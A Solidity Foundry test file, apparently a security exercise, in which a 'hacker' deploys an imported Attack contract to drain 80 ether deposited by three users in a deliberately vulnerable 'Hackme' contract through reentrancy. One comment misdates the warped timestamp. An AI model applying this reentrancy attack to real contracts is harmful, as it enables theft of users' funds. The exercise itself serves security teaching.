// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;
pragma experimental ABIEncoderV2;


import {Test, console} from "forge-std/Test.sol";
import {Hackme} from "../src/Vulnerable.sol";
import {Attack} from "../src/Attack.sol";



contract Exploit is Test {
    Hackme public _hackme;
    address bob;
    address alice;
    address bunny;
    address hacker;

    function setUp() public {
        _hackme = new Hackme();
        bob = address(0x111);
        alice = address(0x222);
        bunny = address(0x333);
        hacker = address(0x444);
        //initialize bob with 100 ether
        payable(bob).transfer(100 ether);
        //initialize alice with 100 ether
        payable(alice).transfer(100 ether);
        //initialize bunny with 100 ether
        payable(bunny).transfer(100 ether);
        //initialize hacker with 2 ether
        payable(hacker).transfer(2 ether);
        //set the time to 1701070800 (1st of March 2024)
        vm.warp(1701070800);
        //check that bunny bob and alice have 100 ether and hacker 2 ether
        assertEq(payable(bob).balance, 100 ether);
        assertEq(payable(alice).balance, 100 ether);
        assertEq(payable(bunny).balance, 100 ether);
        assertEq(payable(hacker).balance, 2 ether);

        //check that the contract has 0 ether
        assertEq(payable(address(_hackme)).balance, 0 ether);
        // bob, alice and bunny deposit between 10 and 70 ether each
        vm.startPrank(bob);
        _hackme.depositFunds{value: 10 ether}();
        vm.stopPrank();
        vm.startPrank(alice);
        _hackme.depositFunds{value: 20 ether}();
        vm.stopPrank();
        vm.startPrank(bunny);
        _hackme.depositFunds{value: 50 ether}();
        vm.stopPrank();
        //check that the contract has 80 ether
        assertEq(payable(address(_hackme)).balance, 80 ether);
    }

    function test_ExploitReentrancy() public {
        
        

        //DO NOT EDIT ABOVE THIS LINE
        /**
        
            Write your exploit to make the hacker rich (at least 20 ether) 
        
         */    
        vm.startPrank(hacker);
        // the hacker deployes its own malicious contract and becomes the owner
        Attack attack = new Attack(address(_hackme));
        // the hacker deposits 1 ether in the malicious contract
        attack.attackVulnerable{value: 1 ether}();
        // the hacker receives the stolen funds from the malicious contract
        attack.getTheMoneyz();
        
        //DO NOT EDIT BELOW THIS LINE
        assertEq(payable(hacker).balance, 82 ether);

    }
    
}
